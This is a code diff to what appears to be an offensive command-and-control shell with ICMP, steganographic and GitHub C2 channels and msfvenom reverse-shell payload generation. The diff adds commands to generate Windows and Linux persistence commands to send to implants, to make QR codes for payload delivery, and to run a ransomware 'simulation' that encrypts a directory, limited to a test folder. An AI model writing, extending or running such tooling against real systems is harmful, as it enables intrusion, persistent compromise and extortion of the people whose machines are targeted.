@@ -35,6 +35,9 @@ from modules.icmp_tunnel import send_icmp_command, icmp_c2_listener
 from modules.suggestor import get_suggestions
 from modules import stego_c2
 from modules.github_c2 import GitHubC2
+from modules import persistence
+import qrcode
+from modules import ransomware
 
 # --- Shell State ---
 github_c2_instance = None
@@ -65,6 +68,9 @@ def print_help():
     print("  generate          - Generate a cross-platform payload (msfvenom)")
     print("  stego_c2          - Use the Steganographic C2 Channel")
     print("  github_c2         - Use the GitHub C2 Channel")
+    print("  persist           - Generate a persistence command")
+    print("  qrcode            - Generate a QR code for payload delivery")
+    print("  ransom            - Run a ransomware simulation")
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
@@ -95,6 +101,25 @@ def print_generate_help():
     print("  linux         - linux/x86/meterpreter/reverse_tcp")
     print("  python        - python/meterpreter/reverse_tcp")
     print("  php           - php/meterpreter/reverse_tcp")
+
+def print_ransom_help():
+    """Prints the help menu for the ransom command."""
+    print("\n--- Ransomware Simulation ---")
+    print("Usage: ransom <directory>")
+    print("Warning: This will encrypt all files in the specified directory.")
+
+def print_qrcode_help():
+    """Prints the help menu for the qrcode command."""
+    print("\n--- QR Code Payload Delivery ---")
+    print("Usage: qrcode <url> <output_file.png>")
+
+def print_persist_help():
+    """Prints the help menu for the persist command."""
+    print("\n--- Persistence Command Generation ---")
+    print("Usage: persist <os> <implant_path>")
+    print("\nSupported OS:")
+    print("  windows")
+    print("  linux")
 
 def print_github_c2_help():
     """Prints the help menu for the github_c2 command."""
@@ -251,6 +276,58 @@ def run_generate_command(args):
         print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
     except subprocess.CalledProcessError as e:
         print(f"Error generating payload: {e}")
+
+def run_ransom_command(args):
+    """Handles the ransom command and its subcommands."""
+    if len(args) != 1:
+        print_ransom_help()
+        return
+
+    directory = args[0]
+
+    # Safety check
+    if directory not in ["/tmp/test_encryption", "./test_encryption"]:
+        print("Error: For safety, this simulation can only be run on '/tmp/test_encryption' or './test_encryption'.")
+        return
+
+    print(f"Running ransomware simulation on {directory}...")
+    result = ransomware.run_ransomware_simulation(directory)
+    print(result)
+
+def run_qrcode_command(args):
+    """Handles the qrcode command and its subcommands."""
+    if len(args) != 2:
+        print_qrcode_help()
+        return
+
+    url, output_file = args
+
+    try:
+        img = qrcode.make(url)
+        img.save(output_file)
+        print(f"QR code saved to {output_file}")
+    except Exception as e:
+        print(f"Error generating QR code: {e}")
+
+def run_persist_command(args):
+    """Handles the persist command and its subcommands."""
+    if len(args) != 2:
+        print_persist_help()
+        return
+
+    os_type, implant_path = args
+
+    if os_type.lower() == "windows":
+        command = persistence.generate_windows_persistence(implant_path)
+        print("\n--- Windows Persistence Command (copy and send to implant) ---")
+        print(command)
+    elif os_type.lower() == "linux":
+        command = persistence.generate_linux_persistence(implant_path)
+        print("\n--- Linux Persistence Command (copy and send to implant) ---")
+        print(command)
+    else:
+        print(f"Error: Unsupported OS '{os_type}'.")
+        print_persist_help()
 
 def run_github_c2_command(args):
     """Handles the github_c2 command and its subcommands."""
@@ -545,6 +622,12 @@ def process_command(cmd_line):
         run_stego_c2_command(args)
     elif command == "github_c2":
         run_github_c2_command(args)
+    elif command == "persist":
+        run_persist_command(args)
+    elif command == "qrcode":
+        run_qrcode_command(args)
+    elif command == "ransom":
+        run_ransom_command(args)
     elif command == "lotl-agent":
         # ... (lotl-agent logic)
         pass
